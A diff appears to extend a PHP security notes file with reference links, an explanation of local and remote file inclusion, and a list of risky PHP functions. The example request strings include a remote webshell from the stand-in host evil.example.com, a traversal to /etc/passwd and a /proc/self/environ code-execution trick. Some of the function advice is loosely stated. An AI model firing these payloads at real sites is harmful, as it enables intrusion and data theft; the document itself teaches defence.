@@ -1,6 +1,43 @@
 https://stackoverflow.com/questions/3115559/exploitable-php-functions
 https://shieldfy.io/security-wiki/php-vulnerabilities/exploitable-php-functions
 https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html
+https://phpsecurity.readthedocs.io/en/latest/_articles/PHP-Security-Default-Vulnerabilities-Security-Omissions-And-Framing-Programmers.html
+https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md
+https://www.csoonline.com/article/3298959/reevaluate-low-risk-php-unserialization-vulnerabilities-researcher-says.html
+https://www.php.net/manual/en/security.filesystem.nullbytes.php
+https://www.php.net/manual/en/security.filesystem.php
+https://www.php.net/manual/en/security.sessions.php
+https://www.php.net/manual/en/security.database.php
+https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/
+https://curiousprog.com/2018/10/03/a-wordpress-die-md5-exploit/
+https://www.cloudways.com/blog/protect-php-website-sql-injection/
+https://www.hahwul.com/2018/11/phar-php-deserialization-vulnerability.html
+
+The developer intended to read in english.php or french.php, which will alter the application's behavior to display the language of the user's choice. But it is possible to inject another path using the language parameter.
+
+/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)
+/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)
+/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]
+/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix-like system through a directory traversal attack.
+/vulnerable.php?language=../../../../../proc/self/environ%00 - allows an attacker to read the contents of the /proc/self/environ file on a Unix-like system through a directory traversal attack. An attacker can modify a HTTP header (such as User-Agent) in this attack to be PHP code to exploit remote code execution.
+
+PHP functions to avoid
+The following is a list of PHP functions that are known to be vulnerable and exploitable. Avoid using these functions in your code.
+
+eval - Using eval is considered bad practice because of its ability to execute arbitrary PHP code.
+serialize/unserialize - Attackers can create an exploit for these functions by passing a string with a serialized arbitrary object to the unserialize function to run arbitrary code.
+md5 - The algorithm for this function is known to have cryptographic weaknesses. You should never use this function for hashing passwords or any other sensitive data.
+srand - Using a predetermined number to seed the random number generator results in a predictable sequence of numbers.
+mt_srand - This function is a pseudo-random number generator (PRNG) and is not cryptographically secure.
+
+Standard PHP library classes to avoid
+ArrayObject - Using ArrayObject class is not recommended because it contains unserialize method, which attackers can use to create an exploit.
+
+If you need to use the ArrayObject class, override the serialize/unserialize methods so that they use secure logic. Convert objects into arrays to serialize them, and reconstruct the objects using arrays during unserialization.
+
+You can use Serialize Library in framework for a secure way of serializing/unserializing data.
 
 Command Execution
 
